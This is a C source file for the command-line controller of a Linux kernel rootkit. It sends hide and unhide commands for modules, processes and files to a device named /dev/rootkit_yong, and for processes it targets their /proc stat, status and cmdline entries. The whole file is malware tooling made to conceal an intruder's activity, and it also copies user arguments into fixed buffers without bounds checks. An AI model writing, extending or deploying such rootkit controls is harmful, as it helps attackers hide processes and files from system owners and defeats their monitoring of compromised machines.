#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define CMD_CNT 6
#define MAX_ARG_LEN 128

enum { INVAL_CMD, INVAL_ARG, DEV_OPEN_FAIL };

const char* command_list[CMD_CNT] = {
	"hide-module",
	"hide-proc",
	"hide-file",
	"unhide-module",
	"unhide-proc",
	"unhide-file"
};

const char* dir_list[3] = {
	"/stat",
	"/status",
	"/cmdline"
};

void print_err(int errno) {
	switch(errno) {
		case INVAL_CMD:
			printf("Invalid command!\n");
			exit(-1);
		case INVAL_ARG:
			printf("invalid argument!\n");
			exit(-1);
		case DEV_OPEN_FAIL:
			printf("Device open fail!\n");
			exit(-1);
	}
}

int main(int argc, char* argv[]) {
	int ret, fd, i, error = 1;
	char message[MAX_ARG_LEN] = {0};
	char temp[MAX_ARG_LEN] = {0};

	if (argc != 3) {
		if ((argc == 2) && (strcmp(argv[1], "hide-module") == 0 || strcmp(argv[1], "unhide-module") == 0))
			;
		else {
			print_err(INVAL_ARG);
			return -1;
		}
	} else {
		for (i=0; i < CMD_CNT; i++) {
			if (strcmp(command_list[i], argv[1]) == 0) {
				error = 0;
			}
		}

		if (error) {
			print_err(INVAL_CMD);
			return -1;
		}
	}

	fd = open("/dev/rootkit_yong", O_RDWR);
	if(fd < 0)
	{
		print_err(DEV_OPEN_FAIL);
		return -1;
	}

	strcpy(message, argv[1]);
	strcat(message, " ");

	if (strcmp(argv[1], "hide-proc") == 0) {
		strcat(message, "/proc/");
		strcat(message, argv[2]);

		for (i = 0; i < 3; i++) {
			strcpy(temp, message);
			strcat(temp, dir_list[i]);
			write(fd, temp, MAX_ARG_LEN);
		}
	} else {
		if (argc == 3)
			strcat(message, argv[2]);
		
		write(fd, message, MAX_ARG_LEN);
	}

	return 0;
}

